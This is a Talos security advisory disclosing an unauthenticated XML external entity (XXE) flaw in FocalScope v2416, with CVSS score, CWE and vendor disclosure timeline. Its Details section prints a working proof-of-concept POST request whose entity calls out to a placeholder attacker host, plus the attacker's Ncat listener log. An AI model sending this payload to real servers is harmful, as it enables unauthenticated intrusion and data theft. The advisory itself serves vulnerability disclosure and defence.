# Talos Vulnerability Report

### TALOS-2018-0559

## FocalScope XML External Entity Injection Vulnerability

##### July 20, 2018

##### CVE Number

CVE-2018-3881

### Summary

An exploitable unauthenticated XML external injection vulnerability was identified in FocalScope v2416. A unauthenticated attacker could submit a specially crafted web request to FocalScope’s server that could cause an XXE, and potentially result in data compromise.

### Tested Versions

FocalScope v2416

### Product URLs

<http://www.focalscope.com/download.html>

### CVSSv3 Score

9.4 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H

### CWE

CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)

### Details

FocalScope v2416 and prior is vulnerable to an unauthenticated XML External Entity injection attack. The following XML payload was used to trigger the XXE:

```
POST /emm/_cros_/xlogin.asp HTTP/1.1
Host: [IP]
Content-Length: 315
Origin: http://[IP]
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Accept: /
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: close

	<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://x.x.x.x/xxe"> %remote;%int;%trick;]><body><o i='msg'><s i='_url'>url:xlogin.asp</s><s i='_fnc'>GetSalt</s><o i='oParam'><s i='sUser'>PCSL</s><s i='sMyName'>self</s><s i='sCallback'>PutSalt</s></o></o></body>

	On the attacking Server the following request can be observed:
Ncat: Connection from x.x.x.x.
Ncat: Connection from x.x.x.x.
GET /xxe HTTP/1.0
Accept: /
UA-CPU: AMD64
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Host: x.x.x.x
Connection: Keep-Alive

```

Note: It was also observed that pretty much any page which takes XML input in POST request is vulnerable to this vulnerability, regardless of whether pages are protected by authentication or not.

### Timeline

2018-04-09 - Vendor Disclosure

2018-04-12 - Sent plain text file to vendor

2018-06-05 - 60 day follow up
